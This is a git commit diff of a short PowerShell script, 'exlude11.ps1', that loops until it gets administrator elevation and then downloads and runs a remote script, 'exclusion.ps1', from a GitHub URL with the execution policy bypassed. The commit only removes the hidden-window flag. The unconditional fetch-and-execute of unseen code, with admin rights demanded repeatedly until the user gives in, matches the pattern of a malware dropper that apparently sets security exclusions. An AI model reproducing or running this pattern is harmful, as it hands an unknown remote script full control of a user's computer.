2570498d4510fe60287703013f64730b7de6a58f
m4x7c <rizzbro995@gmail.com>
2026-01-04 02:05:55 +0600

    Update exlude11.ps1

--- exlude11.ps1
+++ exlude11.ps1
@@ -1,8 +1,9 @@
 do {
     try {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1 | iex"' -Verb RunAs
+        Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1 | iex"' -Verb RunAs
         $success = $true
     } catch {
         $success = $false
     }
 } until ($success)
+
